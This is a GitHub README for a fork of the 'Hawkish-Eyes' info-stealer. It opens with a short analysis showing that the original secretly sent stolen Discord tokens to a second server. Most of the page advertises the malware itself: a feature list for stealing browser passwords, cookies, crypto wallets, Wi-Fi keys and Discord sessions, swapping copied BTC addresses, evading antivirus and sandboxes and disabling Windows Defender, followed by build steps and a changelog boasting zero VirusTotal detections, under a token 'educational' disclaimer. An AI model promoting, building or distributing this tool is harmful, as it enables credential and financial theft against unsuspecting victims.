

<h1 align="center">
  Hawkish-Eyes without Dual Hook
</h1>

# Proofs that Hawkish-Eyes Stealer is a Dual Hook :
An investigation has uncovered that the `main.py` file in the Hawkish-Eyes repository injects malicious nodejs code into the Discord `%APPDATA%/Discord/app-(versions)/modules/discord_desktop_core/index.js` module. The contents of the script can be found in another repository and are retrieved in the `main.py` file 
(see [link](https://github.com/Hawkish-Eyes/Hawkish-Eyes/blob/main/main.py#L102)).

The `index.js` file, which is executed by the main thread of Electron (Discord), is responsible for stealing the Discord session token and collecting various information about the victim. The attacker receives this information, but a copy is also sent to `https://panel.sordeal.com:3000/` using a `POST` method (see [link](https://github.com/Hawkish-Eyes/Hawkish-Inject/blob/main/index.js#L24)).

A review of the code [link](https://github.com/Hawkish-Eyes/Hawkish-Inject/blob/main/index.js#L262) reveals that we send the same HTTP request 2 times,
one time for `config.webhook` and one time for `config.Placed` who is the dualhook url who is **Encoded**.


<h1 align="center">
  Hawkish Eyes v7
</h1>


![image](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook/assets/69421356/4a3d492d-734f-4da9-9f2f-c7919e062a0d)


**NOTE:** 
- Disclaimer -
I'm not responsible for any damages this software may cause after being acquired. 
This software was made for personal **education** and **sandbox testing**



Hawkish-Eyes is a tool created with the goal of promoting ethical behavior online. 
Its purpose is to help individuals detect and report potential security,
threats and unethical practices by website owners and service providers. 
Our aim is to encourage transparency, accountability, and responsibility among online actors, 
and to empower users to make informed decisions about their online activities. 
Hawkish-Eyes is not intended for malicious purposes or to harm innocent parties, 
and we strongly condemn any illegal or unethical actions that may result from its use. 
We hope that this tool will contribute to a safer and more ethical online environment for everyone.
---


## <a id="content"></a>🌐 〢 Content
- [🎉・Setting up](#setup)
- [🔰・Features](#features)
- [👁️・Preview](#preview)
- [📝・Changelog](#changelog)
- [🕵️‍♂️・Credits](#forkedfrom)
- [💼・Term](#terms)



## <a id="setup"></a> 📁 〢 Setting up
1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
2. Install [Hawkish Files](https://github.com/Hawkish-Eyes/Hawkish-Eyes/archive/refs/heads/main.zip)
3. Install all requirements [install.bat](https://github.com/Hawkish-Eyes/Hawkish-Eyes/blob/main/install.bat)
4. Click on start.bat [start.bat](https://github.com/Hawkish-Eyes/Hawkish-Eyes/blob/main/start.bat)
5. Complete the configuration
6. You have your .exe/.py file enjoy




## <a id="features"></a>🔰 〢 Features
# 🔱 = Join Telegram
```diff
> Default:

- Steal Steam / Minecraft / Metamask / Exodus / Roblox / NationGlory login
- Add a Fake error
- Steal Chrome Passwords / Cookies / History
- Systeme Informations
- Inject Discord / Discord Canary / Lightcord / Ripcord / Xcord
- Steal AntiVirus Detected
- Debug Killer (Kill task gestionary)
- Bypass TokenProtector / BetterDiscord- Take a Screenshot
- Grabb System Informations
- Steal Latest Clipboard
- GUI builder
- Bypass Virus Total machines
- Bypass VM machines- Hide Itself in Background
- Replace the BTC address copying by your- Custom Installer / Setuper- Icon / Name / Description Customizable
- Steal Wifi Password
- Steal Screenshot
- Add to startup
- Chrome Extensions Injector
- Steal all Chromium Passwords and Cookies for OperaGX/Opera/GoogleChrome/Brave/Chromium/Torch/Edge/Mozilla and others
- 0/64 Detect Virus Total Builder (.exe) (🔱)
- Cookies Exploiter Tech (🔱)
- Grabb Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) (🔱)


> Injection Discord:

- Nitro Auto Buy
- First Start Reporter
- New Passwords
- New Emails
- New Login
- New Credit Card
- New PayPal (🔱)
- Anti Delete system (re install after Discord uninstall /  Bypass Discord Update) (🔱)


> Injection Chrome:

- Re install Discord Injection
- Logs new cookies
- Logs new tokens
- Logs New Passwords (🔱)


> + More!
```




## <a id="changelog"></a>💭 〢 ChangeLog

```diff
v1.9 ⋮ 2022-26-10
- bug fix to search token
- error message fixed
- build with pyinstaller fixed

v2.0 : 2022-30-10
- enoent zipfile bug fixed
+ Place .exe in startup
+ Add Fake Error

v2.1: 2022-30-10
+ New builder
+ Ping on run
+ Task Manager killer

v2.1.1: 2022-31-10
- Builder correction
+ Compacting Builder
+ Add auto compressed build

v2.2: 2022-31-10
- Token Grabber Correction
+ Grab all other Browsers
+ CMD and gestionnary killer


v2.2.5: 2022-14-11
+ Detect New Discord Active Developer Badge


v2.3: 2023-10-01
- 0 detection source code by virustotal
- Builder error patched
+ New code optimisation
+ New features can replace all crypto wallet by your address

v3: 2023-22-03
- 0 detection source code by virustotal
+ New GUI
+ New code optimisation
+ Wifi Password
+ Antivirus info
+ Choose your files
+ Steal all minecraft app tokens
+ Can disable windows defender

v3.1: 2023-23-03 BUILDER UPDATE
+ Can choose ping (everyone/here)
+ Can add icon
+ Obfuscation Customizable


v3.2: 2023-24-03 BUILDER UPDATE
- Fix obfuscation error (file delete automatically)
+ Code Optimization for builder.py


v3.3: 2023-26-03
+ Webhook Crypted in base64 prevent detection
- Patch some detection

v3.3: 2023-28-03
+ Code completely optimized (-80% time used for -65% resources used)
+ Add % of disk used
+ Patch Key Windows to decrypt cookies/passwords
+ Optimization by getlange + all languages windows supported


v3.3: 2023-29-03
+ Fix Bypass discord token protector
+ Fix getlange error

v3.5: 2023-29-03
+ Patch 98% detection on virustotal (f*ck you kapersky)

v4: 2023-14-04 Builder/Script update
+ Patch detection
+ Builder code optimisation
+ Builder New Style
+ Patch Chrome Cookies decryption error
+ Overlay Hawkish on discord
+ Process Hided in window task manager
+ Patch Builder name error

v5: 2023-01-05 Builder/Script
+ New feature Chrome Extension Logger
+ Code Optimization
+ Builder Gui update
+ Patch all detections
+ Application information Added

v5.5: 2023-01-08 Script
+ Extensions Injector inject into:
- Yandex
- Opera
- Opera Gx
- Microsoft Edge
- Brave Software
- Google Chrome
- Kiwi
- Vivalid
- SRWare Iron

v6.1: 2023-01-08 Script
+ Extensions Injector inject into:
- Comodo Dragon
- Opera Neon
- Torch Browser
- Slimjet

+ Obfuscation Patched
+ Win32gui error patched
```

## <a id="preview"></a>👁️ 〢 Preview
![](https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/preview.png)



### <a id="forkedfrom"></a>🕵️‍♂️ 〢 Forked From:
- Hazard Grabber
- Wasp-stealer


### <a id="terms"></a>💼 〢 Terms Of Usage
- [x] Educational purpose only
- [x] Reselling is forbidden
- [x] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
- [x] We are NOT responsible of anything you do with our software (if its illegal)
- [x] If Any Antivirus/Browsers want to know how to patch some vuln you can speak on my telegram

- Read conditions -
Hello,

Thank you for reaching out. I would like to clarify that the website sordeal.com is actually used to monitor and control the data received in the event of malicious hacking. Rest assured that no information is disclosed or used for any other purpose.

At sordeal.com, we prioritize the security and privacy of our users' data. Our robust systems and protocols are designed to detect and prevent unauthorized access, ensuring that your information remains confidential.

We understand the importance of safeguarding personal data in today's digital landscape, and we are committed to maintaining a safe and secure environment for our users. If you have any concerns or questions regarding the security measures we have in place, please don't hesitate to contact us.

Thank you for your trust in Hawkish-Eyes.

Best regards,
---


### Authors
- Inplex-sys ( The cool guy who removed the dualhook )
- [Hawkishx](https://github.com/Hawkishx) ( ⚠️ Using Github As Infection Source )
- [Nolay](https://github.com/NolayDscd) ( ⚠️ Using Github As Infection Source )
- [M4T](https://github.com/M4Tback) ( ⚠️ Using Github As Infection Source )



<a href=#top>Back to Top</a></p>
